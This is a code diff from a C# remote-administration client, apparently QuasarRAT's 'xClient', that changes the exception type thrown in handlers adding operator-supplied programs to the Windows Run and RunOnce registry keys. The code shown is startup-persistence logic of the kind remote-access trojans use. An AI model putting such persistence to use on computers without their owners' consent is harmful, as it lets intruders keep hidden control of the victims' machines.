@@ -156,7 +156,7 @@ namespace xClient.Core.Commands
                     case 0:
                         using (var key = Registry.LocalMachine.OpenWritableSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                         {
-                            if (key == null) throw new Exception("Registry key does not exist");
+                            if (key == null) throw new ArgumentException("Registry key does not exist");
                             if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
                                 command.Path = "\"" + command.Path + "\"";
                             key.SetValue(command.Name, command.Path);
@@ -166,7 +166,7 @@ namespace xClient.Core.Commands
                     case 1:
                         using (var key = Registry.LocalMachine.OpenWritableSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                         {
-                            if (key == null) throw new Exception("Registry key does not exist");
+                            if (key == null) throw new ArgumentException("Registry key does not exist");
                             if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
                                 command.Path = "\"" + command.Path + "\"";
                             key.SetValue(command.Name, command.Path);
@@ -176,7 +176,7 @@ namespace xClient.Core.Commands
                     case 2:
                         using (var key = Registry.CurrentUser.OpenWritableSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                         {
-                            if (key == null) throw new Exception("Registry key does not exist");
+                            if (key == null) throw new ArgumentException("Registry key does not exist");
                             if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
                                 command.Path = "\"" + command.Path + "\"";
                             key.SetValue(command.Name, command.Path);
@@ -186,7 +186,7 @@ namespace xClient.Core.Commands
                     case 3:
                         using (var key = Registry.CurrentUser.OpenWritableSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                         {
-                            if (key == null) throw new Exception("Registry key does not exist");
+                            if (key == null) throw new ArgumentException("Registry key does not exist");
                             if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
                                 command.Path = "\"" + command.Path + "\"";
                             key.SetValue(command.Name, command.Path);
@@ -199,7 +199,7 @@ namespace xClient.Core.Commands
 
                         using (var key = Registry.LocalMachine.OpenWritableSubKey("SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"))
                         {
-                            if (key == null) throw new Exception("Registry key does not exist");
+                            if (key == null) throw new ArgumentException("Registry key does not exist");
                             if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
                                 command.Path = "\"" + command.Path + "\"";
                             key.SetValue(command.Name, command.Path);
@@ -212,7 +212,7 @@ namespace xClient.Core.Commands
 
                         using (var key = Registry.LocalMachine.OpenWritableSubKey("SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                         {
-                            if (key == null) throw new Exception("Registry key does not exist");
+                            if (key == null) throw new ArgumentException("Registry key does not exist");
                             if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
                                 command.Path = "\"" + command.Path + "\"";
                             key.SetValue(command.Name, command.Path);
